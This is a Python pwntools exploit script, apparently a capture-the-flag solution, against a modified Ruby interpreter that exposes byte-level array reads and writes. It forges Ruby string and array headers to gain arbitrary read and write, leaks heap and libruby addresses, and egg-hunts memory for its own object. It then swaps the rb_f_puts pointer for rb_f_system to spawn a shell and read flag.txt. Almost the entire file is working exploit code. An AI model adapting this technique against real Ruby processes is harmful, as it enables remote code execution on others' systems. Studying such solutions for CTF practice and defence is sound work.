from pwn import *
from tqdm import tqdm

# context.log_level = "debug"
context.arch = "amd64"
context.word_size = 64
if os.getenv("RUNNING_IN_DOCKER"):
    context.terminal = ["/usr/bin/tmux", "splitw", "-h", "-l", "75%"]
else:
    gdb.binary = lambda: "gef"
    context.terminal = ["alacritty", "-e", "zsh", "-c"]

sla = lambda r, s: conn.sendlineafter(r, s)
sl = lambda s: conn.sendline(s)
sa = lambda r, s: conn.sendafter(r, s)
se = lambda s: conn.send(s)
ru = lambda r, **kwargs: conn.recvuntil(r, **kwargs)
rl = lambda: conn.recvline()
uu32 = lambda d: u32(d.ljust(4, b"\x00"))
uu64 = lambda d: u64(d.ljust(8, b"\x00"))

T_STRING = 0x5
T_ARRAY = 0x7
RSTRING_NOEMBED = 0x2000
RARRAY_EMBED_FLAG = 0x2000


def read_op(idx: int):
    sla(b"> ", f"r {idx}".encode())
    return rl().strip()


# can only be used after corrupting a to be a string
def read_op_str(off: int, size: int):
    out = b""
    for i in range(size):
        sla(b"> ", f"r {off + i}".encode())
        out += rl()[:-1]
    return out


def arb_read(addr: int, size: int):
    # make it a non-embedded str
    write_op_qword(0, T_STRING | RSTRING_NOEMBED)
    write_op_qword(8, rb_cString)

    # set the ptr field
    write_op_qword(0x18, addr)
    return read_op_str(0, size)


def write_op_byte(off: int, val: int):
    sla(b"> ", f"w {off} {val}".encode())


def write_op_qword(off: int, val: int):
    for i in range(8):
        b = (val >> (i * 8)) & 0xFF
        write_op_byte(off + i, b)


def arb_write(addr: int, val: bytes):
    global a_addr
    assert a_addr, "a_addr must be found to perform arb writes"
    off = addr - a_addr
    for i in range(len(val)):
        write_op_byte(off + i, val[i])


# just from the docker image
exe = ELF("../src/ruby")
libruby = ELF("../src/libruby.so.4.0")

# conn = process([exe.path, "../src/rw.rb"])
conn = remote("localhost", 1337)

# make it an embedded array
embed_flags = T_ARRAY | RARRAY_EMBED_FLAG | (127 << 15)
write_op_qword(0, embed_flags)

# get a heap leak
write_op_byte(0x20, 1)
heap_addr = (int(read_op(2)) << 1) & ~0xFFF
log.info(f"{heap_addr = :#x}")

# # read the next 127 values
# for i in range(127):
#     # make it a Fixnum so we can read it safely
#     write_op_byte(0x10 + i * 8, 1)
#     o = read_op(i)
#     if not o.isdigit():
#         continue
#     v = int(o)
#     leak = v << 1
#     log.info(f"a[{i}] = {hex(leak)}")

# there happens to reliably be a string located here so we can get rb_cString
# this is a bit unreliable since we guess the lowest byte to be 0x48 but it
# will probably work enough of the time so we don't care
write_op_byte(0x10 + 29 * 8, 1)
v = int(read_op(29)) << 1
rb_cString_LSB = 0x48
rb_cString = v + rb_cString_LSB
log.success(f"{rb_cString = :#x}")

# restore it to avoid shenanigans
write_op_byte(0x10 + 19 * 8, rb_cString_LSB)

rb_cArray = rb_cString - 0xD8E0

# we make 'a' a string now to give a better read
write_op_qword(0, T_STRING)
write_op_qword(8, rb_cString)
write_op_qword(16, 0x4141414142424242)  # string len

# there is a pointer to vm_call_cfunc_with_frame somewhere nearby
# we use this to get the libruby base address
for i in range(20):
    v = u64(read_op_str(i * 8, 8))
    if v & 0xFFF == libruby.sym["vm_call_cfunc_with_frame"] & 0xFFF:
        libruby_base_addr = v - libruby.sym["vm_call_cfunc_with_frame"]
        break
else:
    log.failure("exploit failed... couldn't leak libruby base")
    exit(1)

libruby.address = libruby_base_addr
log.info(f"{libruby_base_addr = :#x}")

# now, we can build an arbitrary read by making the string non embedded and
# setting the ptr field of it
# our strategy here is to scan for things that look like pointers, then follow
# them. if we read something that looks like an array, then this is possibly a
# pointer within the same region where our original "a" array lives. so we scan
# this region for our 0x4141414142424242 len value and this tells us where we are.
a_addr = None
log.info(f"egg-hunting for our address...")
vals = []
for i in tqdm(range(400)):
    v = u64(read_op_str(i * 8, 8).ljust(8, b"\0"))
    vals.append(v)
for i in range(400):
    v = vals[i]
    if v & 0xFFFF00000000 == rb_cArray & 0xFFFF00000000 and v & 0b111 == 0:
        flags = u64(arb_read(v, 8))
        if flags & 0xA007 == 0xA007:
            # heuristically, this is likely to be allocated in the same region
            # as our array, so let's egg-hunt for the len field
            start = v & ~0xFFF
            log.info(f"starting egg-hunt from {hex(start)}")
            for j in tqdm(range(0x1000)):
                if arb_read(start + 8 * j, 1) == b"\x42":
                    if arb_read(start + 8 * j, 8) == p64(0x4141414142424242):
                        a_addr = start + 8 * (j - 2)
                        log.success(f"FOUND! we are at {hex(a_addr)}")
                        break
            else:
                continue
            break

if a_addr is None:
    log.failure("exploit failed... could not find address of a")
    exit(1)

# our strategy for code execution is simple: we will scan the heap looking for
# a pointer to rb_f_puts, and then replace this with rb_f_system. next time we
# call the read op, it will call system instead of puts, so we just need to
# place a fake string object there with our shell command

# heuristically, rb_f_puts is in the heap somewhere before our heap leak. and
# checking in a debugger, it is always at 0xXXXXXXXXXB38. this may vary
# depending on the environment
start = heap_addr
rb_f_puts = libruby.sym["rb_f_puts"]
rb_f_puts_ptr_in_heap = None
log.info(f"starting search for rb_f_puts ({hex(rb_f_puts)}) from {hex(start)}")
for i in tqdm(range(0x800)):
    c = start - 0x1000 * i + 0xB38
    if u8(arb_read(c, 1) or b"\0") == rb_f_puts & 0xFF:
        if u64(arb_read(c, 8)) == rb_f_puts:
            log.success(f"FOUND! rb_f_puts at {hex(c)}")
            rb_f_puts_ptr_in_heap = c
            break

if rb_f_puts_ptr_in_heap is None:
    log.failure("exploit failed... could not find rb_f_puts ptr in heap")
    exit(1)

# now we set up our fake string
# make our original a array back to an embedded aray
embed_flags = T_ARRAY | RARRAY_EMBED_FLAG | (127 << 15)
write_op_qword(0, embed_flags)
write_op_qword(8, rb_cArray)
write_op_qword(0x10, heap_addr)
shell_cmd = b"/bin/sh"
arb_write(
    heap_addr,
    p64(T_STRING | 0x504000) + p64(rb_cString) + p64(len(shell_cmd)) + shell_cmd,
)
arb_write(rb_f_puts_ptr_in_heap, p64(libruby.sym["rb_f_system"]))

sla(b"> ", b"r 0")  # trigger shell
sl(b"ls -lah")
sl(b"cat flag.txt")

conn.interactive()
